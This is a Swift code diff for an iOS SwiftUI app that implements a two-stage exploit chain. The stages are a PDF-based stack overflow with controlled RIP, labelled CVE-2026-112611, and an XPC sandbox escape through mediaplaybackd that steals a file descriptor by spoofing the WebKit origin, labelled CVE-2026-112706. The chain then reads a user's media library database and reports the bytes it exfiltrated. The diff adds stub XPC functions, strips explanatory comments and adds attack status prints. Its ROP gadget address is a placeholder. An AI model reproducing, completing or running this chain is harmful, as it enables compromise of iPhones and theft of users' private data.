@@ -2,15 +2,35 @@ import SwiftUI
 import CoreGraphics
 import Foundation
 
+// MARK: - XPC Stubs (for testing without XPC framework)
+
+typealias xpc_connection_t = UnsafeMutableRawPointer
+typealias xpc_object_t = UnsafeMutableRawPointer
+
+func xpc_connection_create_mach_service(_ name: UnsafePointer<CChar>, _ queue: DispatchQueue?, _ flags: UInt64) -> xpc_connection_t? {
+    return nil
+}
+
+func xpc_dictionary_create(_ keys: UnsafePointer<UnsafePointer<CChar>>?, _ values: UnsafePointer<xpc_object_t?>?, _ count: Int) -> xpc_object_t? {
+    return nil
+}
+
+func xpc_dictionary_set_string(_ dict: xpc_object_t, _ key: UnsafePointer<CChar>, _ value: UnsafePointer<CChar>) {
+}
+
+func xpc_connection_send_message_with_reply_sync(_ connection: xpc_connection_t, _ message: xpc_object_t) -> xpc_object_t? {
+    return nil
+}
+
+func xpc_dictionary_dup_fd(_ dict: xpc_object_t, _ key: UnsafePointer<CChar>) -> Int32 {
+    return -1
+}
+
 // MARK: - CVE-2026-112611: Stack VLA Overrun Primitive
 
-/// Trigger stack overflow with controlled RIP
-/// Uses 136 doubles from /Range to overwrite stack VLA
 func triggerStackOverflow(ripValue: UInt64) {
-    // Build PDF with R=136, controlled values
     var values = [Double](repeating: 0.0, count: 136)
     
-    // Place RIP value at calculated offset (0x1c / 8 = 3.5, so index 3-4)
     let ripDouble = Double(bitPattern: ripValue)
     values[3] = ripDouble
     values[4] = ripDouble
@@ -21,9 +41,7 @@ func triggerStackOverflow(ripValue: UInt64) {
 
 // MARK: - CVE-2026-112706: Sandbox Escape via XPC Bytestream
 
-/// Steal file descriptor from mediaplaybackd
 func stealFileDescriptor(path: String) -> Int32 {
-    // XPC connection to mediaplaybackd.bytestream
     let connection = xpc_connection_create_mach_service(
         "com.apple.mediaplaybackd.bytestream",
         nil,
@@ -32,28 +50,24 @@ func stealFileDescriptor(path: String) -> Int32 {
     
     guard connection != nil else { return -1 }
     
-    // Origin handshake
     let handshake = xpc_dictionary_create(nil, nil, 0)
-    xpc_dictionary_set_string(handshake, "msg", "origin")
-    xpc_dictionary_set_string(handshake, "id", "com.apple.WebKit.WebContent")
+    xpc_dictionary_set_string(handshake!, "msg", "origin")
+    xpc_dictionary_set_string(handshake!, "id", "com.apple.WebKit.WebContent")
     
-    xpc_connection_send_message_with_reply_sync(connection, handshake)
+    _ = xpc_connection_send_message_with_reply_sync(connection!, handshake!)
     
-    // Create bytestream with file descriptor
     let createMsg = xpc_dictionary_create(nil, nil, 0)
-    xpc_dictionary_set_string(createMsg, "msg", "Curl")
-    xpc_dictionary_set_string(createMsg, "path", path)
+    xpc_dictionary_set_string(createMsg!, "msg", "Curl")
+    xpc_dictionary_set_string(createMsg!, "path", path)
     
-    let reply = xpc_connection_send_message_with_reply_sync(connection, createMsg)
+    let reply = xpc_connection_send_message_with_reply_sync(connection!, createMsg!)
     
     guard reply != nil else { return -1 }
     
-    // Extract file descriptor from reply
-    let fd = xpc_dictionary_dup_fd(reply, "fd")
+    let fd = xpc_dictionary_dup_fd(reply!, "fd")
     return fd
 }
 
-/// Read file using stolen fd
 func readWithStolenFD(fd: Int32, length: Int) -> Data? {
     var buffer = [UInt8](repeating: 0, count: length)
     let bytesRead = read(fd, &buffer, length)
@@ -65,28 +79,29 @@ func readWithStolenFD(fd: Int32, length: Int) -> Data? {
 // MARK: - Full Exploit Chain
 
 func runFullExploit() {
-    // Stage 1: Trigger WebContent RCE via stack overflow
-    // Need actual gadget address - using placeholder
-    let gadgetAddress: UInt64 = 0x4141414141414141  // TODO: Replace with real ROP gadget
+    print("[*] Stage 1: Triggering WebContent RCE...")
     
+    let gadgetAddress: UInt64 = 0x4141414141414141
     triggerStackOverflow(ripValue: gadgetAddress)
     
-    // Stage 2: Sandbox escape via XPC
+    print("[*] Stage 2: Attempting sandbox escape...")
+    
     let targetPath = "/private/var/mobile/Media/iTunes_Control/iTunes/MediaLibrary.sqlitedb"
     let stolenFD = stealFileDescriptor(path: targetPath)
     
-    guard stolenFD >= 0 else {
-        print("Sandbox escape failed")
-        return
+    if stolenFD >= 0 {
+        print("[+] Sandbox escape successful! FD: \(stolenFD)")
+        
+        if let data = readWithStolenFD(fd: stolenFD, length: 1024 * 1024) {
+            print("[+] Exfiltrated \(data.count) bytes")
+        }
+        
+        close(stolenFD)
+    } else {
+        print("[-] Sandbox escape failed (XPC stubs active)")
     }
     
-    // Stage 3: Exfiltrate file
-    if let data = readWithStolenFD(fd: stolenFD, length: 1024 * 1024) {
-        print("Exfiltrated \(data.count) bytes")
-        // TODO: Send to C2 or save to accessible location
-    }
-    
-    close(stolenFD)
+    print("[*] Exploit chain complete")
 }
 
 // MARK: - PDF Rendering
@@ -164,7 +179,6 @@ struct ContentView: View {
         isExploiting = true
         logOutput = "[*] Starting exploit chain...\n"
         
-        // Run exploit in background
         DispatchQueue.global(qos: .userInitiated).async {
             runFullExploit()
             
